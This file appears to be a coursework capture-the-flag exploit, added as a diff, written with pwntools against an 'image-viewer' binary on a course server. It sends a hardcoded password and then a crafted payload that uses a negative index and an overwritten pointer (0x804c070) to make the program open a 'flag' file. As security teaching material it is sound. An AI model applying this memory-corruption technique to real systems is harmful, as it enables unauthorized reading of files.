@@ -1,0 +1,79 @@
+#!/usr/bin/env python
+# -*- coding: utf-8 -*-
+# This exploit template was generated via:
+# $ pwn template
+from pwn import *
+
+# Set up pwntools for the correct architecture
+context.update(arch='i386')
+exe = './image-viewer' #Change this
+
+PROGNAME = exe
+REMOTE = "comp6447.wtf" #Change this
+REMOTEPORT = 28136 #Change this
+global p
+global e
+global global_timeout
+
+e = ELF(PROGNAME)
+
+# Many built-in settings can be controlled on the command-line and show up
+# in "args".  For example, to dump all data sent/received, and disable ASLR
+# for all created processes...
+# ./exploit.py DEBUG NOASLR
+
+
+def start(argv=[], *a, **kw):
+    '''Start the exploit against the target.'''
+    if args.GDB:
+        return gdb.debug([exe] + argv, gdbscript=gdbscript, *a, **kw)
+    else:
+        return process([exe] + argv, *a, **kw)
+
+# Specify your GDB script here for debugging
+# GDB will be launched if the exploit is run via e.g.
+# ./exploit.py GDB
+gdbscript = '''
+continue
+'''.format(**locals())
+
+if args.REMOTE:
+    global_timeout = 3
+    p = remote(REMOTE, REMOTEPORT)
+else:
+    global_timeout = 0.5
+    p = process(PROGNAME)
+    p = start()
+#===========================================================
+#                    EXPLOIT GOES HERE
+#===========================================================
+
+p.recvuntil(b'> ', drop=True)
+# Fill up 16 bytes
+payload = b'password123'# + b'\
+p.sendline(payload)
+
+# Work with 16 byte blocks for easier visualiation.
+p.recvuntil(b'> ', drop=True)
+# Input index -2 
+payload = b'-2' + b'a'*14
+# print(len(payload))
+# Place filename + fill to 16 bytes
+payload += b'flag' + b'\0' * 12
+# print(len(payload))
+# Fill until remaining 16 bytes
+payload += b'\0' * (16 * 5)
+# print(len(payload))
+# From the binary, the address to string comes first then the int id.
+# Place negaitve index, -2, as hex
+payload += b'\xfe\xff\xff\xff'
+# print(len(payload))
+# Place address that points to our flag string
+payload += p32(0x804c070)
+# print(len(payload))
+# Fill in remaining. Apparently a payload of size 127 or highest doesn't work.
+payload += b'\0' * (126 - len(payload))
+# print(len(payload))
+p.sendline(payload)
+p.interactive()
+
